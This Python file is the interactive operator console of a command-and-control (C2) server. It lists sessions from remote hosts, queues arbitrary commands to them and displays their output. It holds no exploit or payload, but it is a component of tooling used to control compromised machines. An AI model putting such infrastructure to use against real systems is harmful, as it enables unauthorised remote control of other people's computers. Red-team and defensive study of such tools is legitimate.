import asyncio
import sys

from common import config
from common.logger import get_logger
from server.command_queue import CommandQueue
from server.session_manager import SessionManager
from server.storage import Database

logger = get_logger('api_interface')


# Display constants
COL_ID       = 36   # UUID column width
COL_SHORT    = 16   # hostname, username, status columns
COL_WIDE     = 24   # OS, command columns
COL_NARROW   = 8    # exit code, duration columns
DIVIDER      = '-' * 100


# Formatting helpers
def _banner(session_count: int) -> None:
    # Print startup banner with server address and active session count.
    print()
    print('=' * 60)
    print('  C2 OPERATOR CONSOLE')
    print(f'  Server : https://{config.SERVER_HOST}:{config.BACKEND_PORT}')
    print(f'  Active sessions: {session_count}')
    print('=' * 60)
    print()


def _help() -> None:
    # Print available commands.
    print()
    print('  Commands:')
    print('    list                              — list all sessions')
    print('    task <session_id> <cmd> [args...] — enqueue a task')
    print('    results <session_id>              — show task results')
    print('    kill <session_id>                 — deactivate a session')
    print('    help                              — show this message')
    print('    exit                              — quit')
    print()


def _print_sessions(sessions: list) -> None:
    # Print session list as a formatted table.
    if not sessions:
        print('  No sessions.')
        return

    header = (
        'SESSION ID'.ljust(COL_ID) + '  ' +
        'HOSTNAME'.ljust(COL_SHORT) + '  ' +
        'USERNAME'.ljust(COL_SHORT) + '  ' +
        'OS'.ljust(COL_WIDE) + '  ' +
        'JITTER'.ljust(COL_NARROW) + '  ' +
        'ACTIVE'
    )
    print()
    print(DIVIDER)
    print(header)
    print(DIVIDER)

    for s in sessions:
        row = (
            s.session_id.ljust(COL_ID) + '  ' +
            s.hostname.ljust(COL_SHORT) + '  ' +
            s.username.ljust(COL_SHORT) + '  ' +
            s.os.ljust(COL_WIDE) + '  ' +
            f'{s.jitter_pct}%'.ljust(COL_NARROW) + '  ' +
            ('YES' if s.active else 'NO')
        )
        print(row)

    print(DIVIDER)
    print(f'  {len(sessions)} session(s) total.')
    print()


def _print_results(results: list) -> None:
    # Print task results as a formatted table.
    if not results:
        print('  No results for this session.')
        return

    header = (
        'TASK ID'.ljust(COL_ID) + '  ' +
        'EXIT'.ljust(COL_NARROW) + '  ' +
        'DURATION'.ljust(COL_NARROW) + '  ' +
        'STDOUT'
    )
    print()
    print(DIVIDER)
    print(header)
    print(DIVIDER)

    for r in results:
        # Truncate stdout to 60 chars for table display
        stdout_preview = (r['stdout'] or '').replace('\n', ' ')[:60]
        row = (
            r['task_id'].ljust(COL_ID) + '  ' +
            str(r['exit_code']).ljust(COL_NARROW) + '  ' +
            f'{r["duration_ms"]}ms'.ljust(COL_NARROW) + '  ' +
            stdout_preview
        )
        print(row)

    print(DIVIDER)
    print(f'  {len(results)} result(s) total.')
    print()


def _print_full_result(result) -> None:
    # Print full stdout/stderr for a single result without truncation.
    print(f'\n  Task ID   : {result["task_id"]}')
    print(f'  Exit code : {result["exit_code"]}')
    print(f'  Duration  : {result["duration_ms"]}ms')
    print(f'  STDOUT:\n{result["stdout"] or "(empty)"}')
    if result['stderr']:
        print(f'  STDERR:\n{result["stderr"]}')
    print()


# Command handlers
async def cmd_list(session_mgr: SessionManager, **_) -> None:
    # List all in-memory sessions.
    sessions = await session_mgr.list_sessions()
    _print_sessions(sessions)


async def cmd_task(session_mgr: SessionManager, cmd_queue: CommandQueue,
                   db: Database, args: list) -> None:
    # Enqueue a task for a session: task <session_id> <command> [args...]
    if len(args) < 2:
        print('  Usage: task <session_id> <command> [args...]')
        return

    session_id = args[0]
    command    = args[1]
    task_args  = args[2:]

    session = await session_mgr.get_session(session_id)
    if not session:
        print(f'  ERROR: session {session_id} not found.')
        return

    if not session.active:
        print(f'  ERROR: session {session_id} is inactive.')
        return

    task_id = await cmd_queue.enqueue_task(
        session_id = session_id,
        command    = command,
        args       = task_args,
        timeout_s  = 30,
        db         = db,
    )
    print(f'  Task enqueued — task_id: {task_id}')
    logger.info('operator enqueued task', extra={
        'session_id': session_id,
        'task_id':    task_id,
        'command':    command,
    })


async def cmd_results(session_mgr: SessionManager, db: Database, args: list) -> None:
    # Show all task results for a session.
    if not args:
        print('  Usage: results <session_id>')
        return

    session_id = args[0]
    session    = await session_mgr.get_session(session_id)
    if not session:
        print(f'  ERROR: session {session_id} not found.')
        return

    results = await db.get_results_for_session(session_id)
    _print_results(results)

    # Offer full output for any result by task_id
    if results:
        print('  Enter a task_id to view full output, or press Enter to skip: ', end='')
        choice = input().strip()
        if choice:
            match = next((r for r in results if r['task_id'] == choice), None)
            if match:
                _print_full_result(match)
            else:
                print(f'  Task {choice} not found in results.')


async def cmd_kill(session_mgr: SessionManager, db: Database, args: list) -> None:
    # Deactivate a session.
    if not args:
        print('  Usage: kill <session_id>')
        return

    session_id = args[0]
    session    = await session_mgr.get_session(session_id)
    if not session:
        print(f'  ERROR: session {session_id} not found.')
        return

    await session_mgr.deactivate_session(session_id, db)
    print(f'  Session {session_id} deactivated.')
    logger.info('operator killed session', extra={'session_id': session_id})


# REPL
async def run_repl(db: Database, session_mgr: SessionManager,
                   cmd_queue: CommandQueue) -> None:
    # Run the interactive operator command loop.
    sessions = await session_mgr.list_sessions()
    active   = sum(1 for s in sessions if s.active)
    _banner(active)
    _help()

    while True:
        try:
            line = input('c2> ').strip()
        except (EOFError, KeyboardInterrupt):
            print('\n  Exiting operator console.')
            break

        if not line:
            continue

        parts   = line.split()
        command = parts[0].lower()
        args    = parts[1:]

        if command == 'exit':
            print('  Exiting operator console.')
            break

        elif command == 'help':
            _help()

        elif command == 'list':
            await cmd_list(session_mgr=session_mgr)

        elif command == 'task':
            await cmd_task(
                session_mgr = session_mgr,
                cmd_queue   = cmd_queue,
                db          = db,
                args        = args,
            )

        elif command == 'results':
            await cmd_results(
                session_mgr = session_mgr,
                db          = db,
                args        = args,
            )

        elif command == 'kill':
            await cmd_kill(
                session_mgr = session_mgr,
                db          = db,
                args        = args,
            )

        else:
            print(f'  Unknown command: {command}. Type "help" for usage.')


# Entry point
async def main() -> None:
    async with Database() as db:
        session_mgr = SessionManager()
        cmd_queue   = CommandQueue()

        await session_mgr.restore_from_db(db)

        await run_repl(db, session_mgr, cmd_queue)


if __name__ == '__main__':
    asyncio.run(main())